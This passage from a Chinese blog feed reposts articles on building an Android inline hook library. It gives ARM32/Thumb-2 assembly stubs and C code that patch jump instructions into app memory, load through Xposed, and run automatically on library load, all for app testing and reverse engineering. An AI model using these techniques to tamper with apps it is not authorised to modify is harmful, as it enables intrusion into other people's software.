&lt;p&gt;上图中是我们使用IDA等逆向分析工具时的界面，可以看到其中有一个个小标签，这些小标签就是可能被跳转的目标。因此当我们的备份范围没有跨越两个或多个小标签的时候就不会出现其它指令跳转到我们插桩代码中间的跳转地址处的情况了。&lt;/p&gt;

&lt;h4 id=&#34;使用指导1&#34;&gt;使用指导1&lt;/h4&gt;

&lt;p&gt;不要“跨代码块”进行Hook。&lt;/p&gt;

&lt;h4 id=&#34;局限分析2&#34;&gt;局限分析2&lt;/h4&gt;

&lt;p&gt;这个情况与其说是局限，倒更应当是个使用指导上的说明：有使用者可能会去用本工具Hook某函数的末尾从而希望获取返回值。于是将目标地址对准了那个函数最后的指令上。我个人不建议这么做，而是建议Hook在它的上层调用函数中，也就是调用这个函数后的语句上来获取寄存器R0中的返回值。&lt;/p&gt;

&lt;p&gt;如果真的遇到了不得不Hook在函数末尾附近的情况，那这个工具也是完全可以Hook到的：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;对于Arm32来说&lt;/code&gt;：Arm32的函数结尾一般是几条与逻辑无关的恢复寄存器状态的代码，它们在返回值R0计算出来之后执行，因此Hook它们后即可读取返回值R0的内容。如果很不幸，遇到了极为少见的情况：备份的两条里第一条和R0有关，第二条直接跳转返回了，没有恢复寄存器之类的指令，那也就一条和返回值有关的汇编指令而已，输出这条的寄存器状态，然后脑算这条汇编都知道之后的效果。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;对于Thumb-2来说&lt;/code&gt;：同理，可以Hook在函数末尾跳转前的几条指令上就能得到已经计算好的返回值了。极端情况下也只需根据几条指令前的寄存器状态推算一下之后的状态。&lt;/p&gt;

&lt;h4 id=&#34;使用指导2&#34;&gt;使用指导2&lt;/h4&gt;

&lt;p&gt;想得到函数的返回值应该去调用它的函数里Hook，而不是在目标函数末尾。实在有特殊情况的话本工具的Hook信息依然可以很轻松推算出返回值。&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;本文为转载文章 ，原文出处：&lt;a href=&#34;https://gtoad.github.io/2018/07/13/Android-Inline-Hook-Fix/&#34;&gt;GToad Blog&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
      
    </item>
    
    <item>
      <title>(转)Android Native Hook工具实践</title>
      <link>https://naivete.cc/post/android-native-hook%E5%B7%A5%E5%85%B7%E5%AE%9E%E8%B7%B5/</link>
      <pubDate>Mon, 30 Jul 2018 14:48:12 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android-native-hook%E5%B7%A5%E5%85%B7%E5%AE%9E%E8%B7%B5/</guid>
      
        <description>

&lt;h2 id=&#34;前言&#34;&gt;前言&lt;/h2&gt;

&lt;p&gt;在目前的安卓APP测试中对于Native Hook的需求越来越大，越来越多的APP开始逐渐使用NDK来开发核心或者敏感代码逻辑。个人认为原因如下：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;安全的考虑。各大APP越来越注重安全性，NDK所编译出来的so库逆向难度明显高于java代码产生的dex文件。越是敏感的加密算法与数据就越是需要用NDK进行开发。&lt;/li&gt;
&lt;li&gt;性能的追求。NDK对于一些高性能的功能需求是java层无法比拟的。&lt;/li&gt;
&lt;li&gt;手游的兴起。虚幻4，Unity等引擎开发的手游中都有大量包含游戏逻辑的so库。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;因此，本人调查了一下Android Native Hook工具目前的现状。尽管Java层的Hook工具多种多样，但是Native Hook的工具却非常少并且在&lt;code&gt;安卓5.0以上&lt;/code&gt;的适配工具更是寥寥无几。（文末说明1）而目前Native Hook主要有两大技术路线：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;PLT Hook&lt;/li&gt;
&lt;li&gt;Inline Hook&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;这两种技术路线本人都实践了一下，关于它们的对比，我在&lt;a href=&#34;https://gtoad.github.io/2018/07/05/Android-Native-Hook/&#34;&gt;《Android Native Hook技术路线概述》&lt;/a&gt;中有介绍，所以这里就不多说了。最终，我用了&lt;code&gt;Inline Hook&lt;/code&gt;来做这个项目。&lt;/p&gt;

&lt;p&gt;本文篇幅已经较长，因此写了一些独立的学习笔记来对其中的细节问题进行解释：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://gtoad.github.io/2018/07/05/Android-Native-Hook/&#34;&gt;《Android Native Hook技术路线概述》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://gtoad.github.io/2018/07/13/Android-Inline-Hook-Fix/&#34;&gt;《Android Inline Hook中的指令修复》&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/GToad/Android_Inline_Hook&#34;&gt;项目仓库&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/GToad/Android_Inline_Hook_Arm_Example&#34;&gt;项目案例——Arm32&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/GToad/Android_Inline_Hook_Thumb_Example&#34;&gt;项目案例——Thumb-2&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;目标效果&#34;&gt;目标效果&lt;/h2&gt;

&lt;p&gt;根据本人自身的使用需求提出了如下几点目标：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;工具运行原理中不能涉及调试目标APP，否则本工具在遇到反调试措施的APP时会失效。尽管可以先去逆向调试patch掉反调试功能，但是对于大多数情况下只是想看看参数和返回值的Hook需求而言，这样的前期处理实在过于麻烦。&lt;/li&gt;
&lt;li&gt;依靠现有的各大Java Hook工具就能运行本工具，换句话说就是最好能用类似这些工具的插件的形式加载起本工具从而获得Native Hook的能力。由于Java Hook工具如Xposed、YAHFA等对于各个版本的Android都做了不错的适配，因此利用这些已有的工具即可向目标APP的Native层中注入我们的Hook功能将会方便很多小伙伴的使用。&lt;/li&gt;
&lt;li&gt;既然要能够让各种Java Hook工具都能用本工具得到Native Hook的能力，那就这个工具就要有被加载起来以后自动执行自身功能逻辑的能力！而不是针对各个Java Hook工具找调用起来的方式。&lt;/li&gt;
&lt;li&gt;要适配Android NDK下的armv7和thumb-2指令集。由于现在默认编译为thumb-2模式，所以对于thumb16和thumb32的Native Hook支持是重中之重。&lt;/li&gt;
&lt;li&gt;修复Inline Hook后的原本指令。&lt;/li&gt;
&lt;li&gt;Hook目标的最小单位至少是函数，最好可以是某行汇编代码。&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;最终方案&#34;&gt;最终方案&lt;/h2&gt;

&lt;p&gt;最后完成项目的方案是：本工具是一个so库。用Java Hook工具在APP的入口Activity运行一开始的onCreate方法处Hook，然后加载本so。 加载后，自动开始执行Hook逻辑。 为了方便叙述，接下来的Java Hook工具我就使用目前这类工具里最流行的&lt;code&gt;Xposed&lt;/code&gt;，本项目的生成文件名为&lt;code&gt;libautohook.so&lt;/code&gt;。&lt;/p&gt;

&lt;h2 id=&#34;自动执行&#34;&gt;自动执行&lt;/h2&gt;

&lt;p&gt;我们只是用Xposed加载了这个libautohook.so，那其中的函数该怎么自动执行呢？ 目前想到两个方法：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;利用JniOnload来自动执行。该函数是NDK中用户可以选择性自定义实现的函数。如果用户不实现，则系统默认使用NDK的版本为1.1。但是如果用户有定义这个函数，那Android VM就会在System.loadLibrary()加载so库时自动先执行这个函数来获得其返回的版本号。尽管该函数最终要返回的是NDK的版本号，但是其函数可以加入任意其它逻辑的代码，从而实现加载so时的自动执行。这样就能优先于所有其它被APP NDK调用的功能函数被调用，从而进行Hook。目前许多APP加固工具和APP初始化工作都会用此方法。&lt;/li&gt;
&lt;li&gt;本文采用的是第二种方法。该方法网络资料中使用较少。它是利用了&lt;code&gt;__attribute__((constructor))&lt;/code&gt;属性。使用这个constructor属性编译的普通ELF文件被加载入内存后，最先执行的不是main函数，而是具有该属性的函数。同样，本项目中利用此属性编译出来的so文件被加载后，尽管so里没有main函数，但是依然能优先执行，且其执行甚至在JniOnload之前。于是逆向分析了一下编译出来的so库文件。发现具有&lt;code&gt;constructor&lt;/code&gt;属性的函数会被登记在.init_array中。（相对应的&lt;code&gt;destructor&lt;/code&gt;属性会在ELF卸载时被自动调用，这些函数会被登记入.fini_array）&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730143629.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;值得一提的是，&lt;code&gt;constructor&lt;/code&gt;属性的函数是可以有多个的，对其执行顺序有要求的同学可以通过在代码中对这些函数声明进行排序从而改变其在.init_array中的顺序，二者是按顺序对应的。而执行时，会从.init_array中自上而下地执行这些函数。所以图中的自动优先执行顺序为：main5-&amp;gt;main3-&amp;gt;main1-&amp;gt;main2-&amp;gt;main4。并且后面会说到，从+1可以看出这些函数是thumb模式编译的。&lt;/p&gt;

&lt;h2 id=&#34;方案设计&#34;&gt;方案设计&lt;/h2&gt;

&lt;p&gt;先说一下使用的工具：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;使用&lt;code&gt;keystone&lt;/code&gt;查找指定架构下汇编指令的机器码&lt;/li&gt;
&lt;li&gt;使用&lt;code&gt;MS VISIO&lt;/code&gt;制作了下面的设计图&lt;/li&gt;
&lt;li&gt;调试工具用的是&lt;code&gt;IDA pro&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;####Arm32方案&lt;/p&gt;

&lt;p&gt;现在我们的代码可以在一开始就执行了，那该如何设计这套Inline Hook方案呢？目标是thumb-2和arm指令集下是两套相似的方案。我参考了腾讯游戏安全实验室的一篇教程，其中给出了一个初步的armv7指令集下的Native Hook方案，整理后如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730143753.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h6 id=&#34;arm-第1步&#34;&gt;Arm 第1步&lt;/h6&gt;

&lt;p&gt;根据/proc/self/map中目标so库的内存加载地址与目标Hook地址的偏移计算出实际需要Hook的内存地址。将目标地址处的2条ARM32汇编代码（8 Bytes）进行备份，然后用一条LDR PC指令和一个地址（共计8 Bytes）替换它们。这样就能（以arm模式）将PC指向图中第二部分stub代码所在的位置。由于使用的是LDR而不是BLX，所以lr寄存器不受影响。关键代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;//LDR PC, [PC, #-4]对应的机器码为：0xE51FF004 
BYTE szLdrPCOpcodes[8] = {0x04, 0xF0, 0x1F, 0xE5};
//将目的地址拷贝到跳转指令下方的4 Bytes中 
memcpy(szLdrPCOpcodes + 4, &amp;amp;pJumpAddress, 4);
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;arm-第2步&#34;&gt;Arm 第2步&lt;/h6&gt;

&lt;p&gt;构造stub代码。构造思路是先保存当前全部的寄存器状态到栈中。然后用BLX命令（以arm模式）跳转去执行用户自定义的Hook后的函数。执行完成后，从栈恢复所有的寄存器状态。最后（以arm模式）跳转至第三部分备份代码处。关键代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;_shellcode_start_s:
    push    {r0, r1, r2, r3}
    mrs     r0, cpsr
    str     r0, [sp, #0xC]
    str     r14, [sp, #8]   
    add     r14, sp, #0x10
    str     r14, [sp, #4]    
    pop     {r0}               
    push    {r0-r12}           
    mov     r0, sp
    ldr     r3, _hookstub_function_addr_s
    blx     r3
    ldr     r0, [sp, #0x3C]
    msr     cpsr, r0
    ldmfd   sp!, {r0-r12}       
    ldr     r14, [sp, #4]
    ldr     sp, [r13]
    ldr     pc, _old_function_addr_s
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;arm-第3步&#34;&gt;Arm 第3步&lt;/h6&gt;

&lt;p&gt;构造备份代码。构造思路是先执行之前备份的2条arm32代码（共计8 Btyes），然后用LDR指令跳转回Hook地址+8bytes的地址处继续执行。此处先不考虑PC修复，下文会说明。构造出来的汇编代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;备份代码1
备份代码2
LDR PC, [PC, #-4]
HOOK_ADDR+8
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;thumb-2方案&#34;&gt;Thumb-2方案&lt;/h4&gt;

&lt;p&gt;以上是本工具在arm指令集上的Native Hook基本方案。那么在thumb-2指令集上该怎么办呢？我决定使用多模式切换来实现(文末解释2)，整理后如下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730143915.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;虽然这部分内容与arm32很相似，但由于细节坑较多，所以我认为下文重新梳理详细思路是必要的。&lt;/li&gt;
&lt;/ul&gt;

&lt;h6 id=&#34;thumb-2-第1步&#34;&gt;Thumb-2 第1步&lt;/h6&gt;

&lt;p&gt;第一步，根据/proc/self/map中目标so库的内存加载地址与目标Hook地址的偏移计算出实际需要Hook的内存地址。将目标地址处的X Bytes的thumb汇编代码进行备份。然后用一条LDR.W PC指令和一个地址（共计8 Bytes）替换它们。这样就能（以arm模式）将PC指向图中第二部分stub代码所在的位置。由于使用的是LDR.W而不是BLX，所以lr寄存器不受影响。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节1&lt;/code&gt;：为什么说是X Bytes？参考了网上不少的资料，发现大部分代码中都简单地将arm模式设置为8 bytes的备份，thumb模式12 bytes的备份。对arm32来说很合理，因为2条arm32指令足矣，上文处理arm32时也是这么做的。而thumb-2模式则不一样，thumb-2模式是thumb16（2 bytes）与thumb32（4 bytes）指令混合使用。本人在实际测试中出现过2+2+2+2+2+4&amp;gt;12的情形，这种情况下，最后一条thumb32指令会被截断，从而在备份代码中执行了一条只有前半段的thumb32，而在4-&amp;gt;1的返回后还要执行一个只有后半段的thumb32。因此，本项目最初在第一步备份代码前会检查最后第11和12byte是不是前半条thumb32，如果不是，则备份12 byte。如果是的话，就备份10 byte。但是后来发现也不行，因为Thumb32指令的低16位可能会被误判为新Thumb32指令的开头。因此，最终通过统计末尾连续“疑似”Thumb32高16位的数量，当数量为单数则备份10 bytes，数量为偶数则备份12 bytes。这么做的原因如下：如果这个16位符合Thumb32指令的高16位格式，那它肯定不是Thumb16，只可能是Thumb32的高16位或低16位。因为Thumb16是不会和Thumb32有歧义的。那么，当它前面的16位也是类似的“疑似”Thumb32的话，可能是它俩共同组成了一个Thumb32，也可能是它们一个是结尾一个是开头。所以，如果结尾出现1条疑似Thumb32，则说明这是一条截断的，出现2条疑似Thumb32，说明它俩是一整条，出现3条，说明前2条是一条thumb32，最后一条是被截断的前部分，依此类推。用下面这张图可能更容易理解，总之：&lt;code&gt;疑似Thumb32的2 Bytes可能是Thumb32高16位或Thumb32低16位，但不可能是Thumb16&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144008.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节2&lt;/code&gt;：为什么Plan B是10 byte？我们需要插入的跳转是8 byte，但是thumb32中如果指令涉及修改PC的话，那么这条指令所在的地址一定要能整除4，否则程序会崩溃。我们的指令地址肯定都是能被2整除的，但是能被4整除是真的说不准。因此，当出现地址不能被4整除时，我们需要先补一个thumb16的NOP指令（2 bytes）。这样一来就需要2+8=10 Bytes了。尽管这时候选择14 Bytes也差不多，我也没有内存空间节省强迫症，但是选择这10 Bytes主要还是为了提醒一下大家这边补NOP的细节问题。 关键代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;bool InitThumbHookInfo(INLINE_HOOK_INFO* pstInlineHook)
{
    ......

    uint16_t *p11;

    for (int k=5;k&amp;gt;=0;k--){
        p11 = pstInlineHook-&amp;gt;pHookAddr-1+k*2;
        LOGI(&amp;quot;P11 : %x&amp;quot;,*p11);
        if(isThumb32(*p11)){
            is_thumb32_count += 1;
        }else{
            break;
        }
    }

    //如果是的话就需要备份14byte或者10byte才能使得汇编指令不被截断。由于跳转指令在补nop的情况下也只需要10byte， 
    //所以就取pstInlineHook-&amp;gt;backUpLength为10 
    if(is_thumb32_count%2==1)
    {
        LOGI(&amp;quot;The last ins is thumb32. Length will be 10.&amp;quot;);
        pstInlineHook-&amp;gt;backUpLength = 10;
    }
    else{
        LOGI(&amp;quot;The last ins is not thumb32. Length will be 12.&amp;quot;);
        pstInlineHook-&amp;gt;backUpLength = 12;
    }

    //修正：否则szbyBackupOpcodes会向后偏差1 byte 
    memcpy(pstInlineHook-&amp;gt;szbyBackupOpcodes, pstInlineHook-&amp;gt;pHookAddr-1, pstInlineHook-&amp;gt;backUpLength); 
    
    ......
}

bool BuildThumbJumpCode(void *pCurAddress , void *pJumpAddress)
{
    ......

        //LDR PC, [PC, #0]对应的thumb机器码为：0xf000f8df, NOP为BF00 
        if (CLEAR_BIT0((uint32_t)pCurAddress) % 4 != 0) {
            BYTE szLdrPCOpcodes[12] = {0x00, 0xBF, 0xdF, 0xF8, 0x00, 0xF0};
            memcpy(szLdrPCOpcodes + 6, &amp;amp;pJumpAddress, 4);
            memcpy(pCurAddress, szLdrPCOpcodes, 10);
            cacheflush(*((uint32_t*)pCurAddress), 10, 0);
        }
        else{
            BYTE szLdrPCOpcodes[8] = {0xdF, 0xF8, 0x00, 0xF0};
            //将目的地址拷贝到跳转指令缓存位置 
            memcpy(szLdrPCOpcodes + 4, &amp;amp;pJumpAddress, 4);
            memcpy(pCurAddress, szLdrPCOpcodes, 8);
            cacheflush(*((uint32_t*)pCurAddress), 8, 0);
        }

    ......
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;thumb-2-第2步&#34;&gt;Thumb-2 第2步&lt;/h6&gt;

&lt;p&gt;构造stub代码。构造思路是先保存当前全部的寄存器状态到栈中。然后用BLX命令（以arm模式）跳转去执行用户自定义的Hook后的函数。执行完成后，从栈恢复所有的寄存器状态。最后（以thumb模式）跳转至第三部分备份代码处。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节1&lt;/code&gt;：为什么跳转到第三部分要用thumb模式？因为第三部分中是含有备份的thumb代码的，而同一个顺序执行且没有内部跳转的代码段是无法改变执行模式的。因此，整个第三部分的汇编指令都需要跟着备份代码用thumb指令来编写。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节2&lt;/code&gt;：第二部分是arm模式，但是第三部分却是thumb模式，如何切换？我在&lt;code&gt;第一步的细节2&lt;/code&gt;中提到过，无论是arm还是thumb模式，每条汇编指令的地址肯定都能整除2，因为最小的thumb16指令也需要2 Bytes。那么这时候Arm架构就规定了，当跳转地址是单数时，就代表要切换到thumb模式来执行；当跳转地址是偶数时，就代表用Arm模式来执行。这个模式不是切换的概念，换句话说与跳转前的执行模式无关。无论跳转前是arm还是thumb，只要跳转的目标地址是单数就代表接下来要用thumb模式执行，反之arm模式亦然。这真的是个很不错的设定，因为我们只需要考虑接下来的执行模式就行了。这里，本人就是通过将第三部分的起始地址+1来使得跳转后程序以thumb模式执行。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节3&lt;/code&gt;：下方的关键代码中&lt;code&gt;ldr r3, _old_function_addr_s_thumb&lt;/code&gt;到&lt;code&gt;str r3, _old_function_addr_s_thumb&lt;/code&gt;就是用来给目标地址+1的。这部分代码不能按照逻辑紧贴着最后的&lt;code&gt;ldr pc, _old_function_addr_s_thumb&lt;/code&gt;来写，而是一定要写在恢复全部寄存器状态的前面，否则这里用到的r3会错过恢复从而引起不稳定。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节4&lt;/code&gt;：那条bic指令是用来清除&lt;code&gt;_old_function_addr_s_thumb&lt;/code&gt;变量的最低位的。因为如果该Hook目标会被多次调用，那每次这个&lt;code&gt;_old_function_addr_s_thumb&lt;/code&gt;都会被+1。第一次没有问题，成功变成了thumb模式，而第二次会以arm模式下偏2 bytes跳转，之后偏差越来越大，模式交叉出现。因此，本人使用bic指令来清除每次Hook调用后的地址+1效果。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节5&lt;/code&gt;：用户自定义的Hook功能函数是有一个参数的&lt;code&gt;pt_regs *regs&lt;/code&gt;，这个参数就是用&lt;code&gt;mov r0, sp&lt;/code&gt;传递的，此时r0指向的这个结构就是Hook跳转前寄存器的状态。不会受到stub或者Hook功能函数的影响。使用时&lt;code&gt;regs-&amp;gt;uregs[0]&lt;/code&gt;就是R0寄存器，&lt;code&gt;regs-&amp;gt;uregs[6]&lt;/code&gt;就是R6寄存器，&lt;code&gt;regs-&amp;gt;uregs[12]&lt;/code&gt;就是R12寄存器，&lt;code&gt;regs-&amp;gt;uregs[13]&lt;/code&gt;就是SP寄存器，&lt;code&gt;regs-&amp;gt;uregs[14]&lt;/code&gt;就是LR寄存器，&lt;code&gt;regs-&amp;gt;uregs[15]&lt;/code&gt;就是PSR寄存器（而不是PC寄存器，PC寄存器不备份）。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节6&lt;/code&gt;：保存寄存器的细节是怎么样的？栈上从高地址到低地址依次为：CPSR,LR,SP,R12,…,R0。并且在Thumb-2方案下，CPSR中的T位会先保存为第二部分所需的0，而不是原来的thumb模式下的T:1，在跳转到第三部分时，会重新把T位变成1的。具体如下图所示，图中的CPSR的第6个bit就是T标志，因此原本是0x20030030，保存在栈上的是0x20030010，最后进入第三部分时，依然能够恢复成0x20030030。&lt;code&gt;图中R0从0x1变成了0x333只是该次APP测试中自定义的User’s Hook Stub Function中的处理内容：regs-&amp;gt;uregs[0]=0x333;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144128.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;关键代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;_shellcode_start_s_thumb:
    push    {r0, r1, r2, r3}
    mrs     r0, cpsr
    str     r0, [sp, #0xC]
    str     r14, [sp, #8]   
    add     r14, sp, #0x10
    str     r14, [sp, #4]    
    pop     {r0}               
    push    {r0-r12}           
    mov     r0, sp
    ldr     r3, _hookstub_function_addr_s_thumb
    blx     r3
    ldr     r3, _old_function_addr_s_thumb
    bic     r3, r3, #1
    add     r3, r3, #0x1
    str     r3, _old_function_addr_s_thumb
    ldr     r3, [sp, #-0x34]
    ldr     r0, [sp, #0x3C]
    msr     cpsr, r0
    ldmfd   sp!, {r0-r12}       
    ldr     r14, [sp, #4]
    ldr     sp, [r13]
    ldr     pc, _old_function_addr_s_thumb
&lt;/code&gt;&lt;/pre&gt;

&lt;h6 id=&#34;thumb-2-第3步&#34;&gt;Thumb-2 第3步&lt;/h6&gt;

&lt;p&gt;第三步，构造备份代码。构造思路是先执行之前备份的X Bytes的thumb-2代码，然后用LDR.W指令来跳转回Hook地址+Xbytes的地址处继续执行。此处先不考虑PC修复，下文会说明。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节1&lt;/code&gt;：LDR是arm32的指令，LDR.W是thumb32的指令，作用是相同的。这里想说的是：为什么整个过程中都一直在用LDR和LDR.W，只有在第二步中有使用过BLX指令来进行跳转？原因很简单，为了保存状态。从第一步跳转到stub开始，如果跳转使用了BLX，那就会影响到lr等寄存器，而如果使用LDR/LDR.W则只会改变PC来实现跳转而已。stub中唯一的那次BLX是由于当时需要跳转到用户自己写的Hook功能函数中，这是个正规的函数，它最后需要凭借BLX设置的lr寄存器来跳转回BLX指令的下一条指令。并且这个唯一的BLX处于保存全部寄存器的下面，恢复全部寄存器的上面，这部分的代码就是所谓的“安全地带”。因此，这其中改变的lr寄存器将在之后被恢复成最初始的状态。&lt;code&gt;第二步的细节3&lt;/code&gt;中提及的r3寄存器的操作要放在这个“安全区”里也是这个原因。而在stub之外，我们的跳转只能影响到PC，不可以去改变lr寄存器，所以必须使用LDR/LDR.W。&lt;/p&gt;

&lt;p&gt;&lt;code&gt;细节2&lt;/code&gt;：下面的抽象图中可以发现与arm中的不同，arm中最后是&lt;code&gt;LDR PC, [PC, #-4]&lt;/code&gt;,这是由于CPU三级流水的关系，执行某条汇编指令时，PC的值在arm下是当前地址+8，在thumb-2下是当前地址+4。而我们要跳转的地址在本条指令后的4 Bytes处，因此，arm下需要PC-4，thumb下就是PC指向的地址。&lt;/p&gt;

&lt;p&gt;构造出来的汇编代码抽象形式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;备份代码1
备份代码2
备份代码3
......
LDR.W PC, [PC, #0]
HOOK_ADDR + X
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;指令修复-概述&#34;&gt;指令修复（概述）&lt;/h2&gt;

&lt;p&gt;&lt;code&gt;注：本部分内容较多且相关代码占了几乎本项目开发的一半时间，故此处仅给出概述，本人之后为这部分内容独立写一篇文章&lt;/code&gt;&lt;a href=&#34;https://gtoad.github.io/2018/07/13/Android-Inline-Hook-Fix/&#34;&gt;《Android Inline Hook中的指令修复》&lt;/a&gt;&lt;code&gt;来详细介绍以方便读者更好地学习这方面内容。&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在上文的处理中，我们很好地保存并恢复了寄存器原本的状态。那么，原本目标程序的汇编指令真的是在它原有的状态下执行的吗？依然不是。虽然寄存器的确一模一样，但是那几条被备份的指令是被移动到了另一个地址上。这样当执行它们的时候PC寄存器的值就改变了。因此，如果这条指令的操作如果涉及到PC的值，那这条指令的执行效果就很可能和原来不一样。所以，我们需要对备份的指令进行修复。在实际修复过程中，本人发现还有些指令也受影响，有如下几种：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;取PC的值进行计算的指令&lt;/li&gt;
&lt;li&gt;跳转到备份区域的指令&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;第一种我们已经解释过了，而第二种则是由于我们备份区域中的代码已经被替换了，如果有跳转到这个区域的指令，那接下来执行的就不试原来这个位置的指令了。我们可以再把第二类细分成两类：&lt;code&gt;从备份区域跳转到备份区域的指令&lt;/code&gt;和&lt;code&gt;从备份区域外跳转到备份区域的指令&lt;/code&gt;，前者本人通过计算目标代码在备份区域中的绝对地址来代替原来的目标地址从而修复，而后者由于不知道整个程序中到底有多少条指令会跳转过来，所以无法修复。不过个人认为这后者遇到的概率极小极小。因为我们使用Native Hook前肯定已经逆向分析过了，在IDA这类软件中看到自己即将备份的区域里被打上了类似”loc_XXXXXX”的标签时，一定会小心的。&lt;/p&gt;

&lt;p&gt;这部分的修复操作参考了&lt;code&gt;ele7enxxh&lt;/code&gt;大神的博客和项目，里面修复了许多可能出现的PC相关指令的情况，从中的确启发了许多！但依然有点BUG,主要集中在BNE BEQ这些条件跳转的指令修复上，以及CPU模式切换上容易忽略一些地址+1的问题。本项目中对这些本人已经遇到的BUG进行了修复。具体PC相关指令的修复细节本人之后会独立写一篇&lt;a href=&#34;https://gtoad.github.io/2018/07/13/Android-Inline-Hook-Fix/&#34;&gt;《Android Inline Hook中的指令修复》&lt;/a&gt;，其中也会提到我之前说的那些BUG的修复与改进。本人在此中只说一下本项目中是如何处理这个环节的：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;遍历备份的指令，arm32自然是一个个4 bytes的指令取走去处理就好，thumb-2则需要判断指令是thumb16还是thumb32，把它们一条条取出来处理。&lt;/li&gt;
&lt;li&gt;对每条指令进行PC修复，根据Hook目标地址和该指令在备份代码里的偏移以及CPU的三级流水作用来计算出这条指令当时原本PC的值。从而用这个计算出来的值来代替这个指令中对当前PC的计算。&lt;/li&gt;
&lt;li&gt;将每条备份代码修复后的代码按顺序拼接（不需要修复的就用原来的指令去拼接），并在末尾拼接上原本的LDR/LDR.W跳转指令。&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;于是上文第三步中构造出来的汇编代码抽象形式如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;备份代码1
备份代码2
涉及PC的备份代码3的修复代码1
涉及PC的备份代码3的修复代码2
涉及PC的备份代码3的修复代码3
涉及PC的备份代码3的修复代码4
涉及PC的备份代码3的修复代码5
备份代码4
涉及PC的备份代码5的修复代码1
涉及PC的备份代码5的修复代码2
LDR/LDR.W PC, [PC, #-4]
HOOK_ADDR + X
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;条件跳转的修复方式-以thumb为例&#34;&gt;条件跳转的修复方式（以Thumb为例）&lt;/h4&gt;

&lt;p&gt;在ARM32、Thumb16、Thumb32中都是有条件跳转的指令的，本项目三套都修复了。下面来讲一下Thumb16下条件跳转的修复，作为整个&lt;code&gt;指令修复&lt;/code&gt;的典型代表吧。&lt;/p&gt;

&lt;p&gt;条件跳转指令的修复相比于其它种类的指令有一个明显恶心的地方，看下面两张图可以很明显看出来，先看第一张：&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144215.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;12 Bytes的备份代码与各自对应的修复代码自上而下一一对应，尾部再添加个跳转回原程序的LDR。这就是上文中设想的最标准的修复方式。然而当其中混入了一条条件跳转指令后：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180730144235.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;我们发现按照原程序的顺序和逻辑去修复条件跳转指令的话，会导致条件跳转指令对应的修复指令（图中红色部分）不是完整的一部分，而且第二部分需要出现在返回原程序跳转的后面才能保持原来的程序逻辑。这时有两个问题：&lt;/p&gt;

&lt;ol&gt;
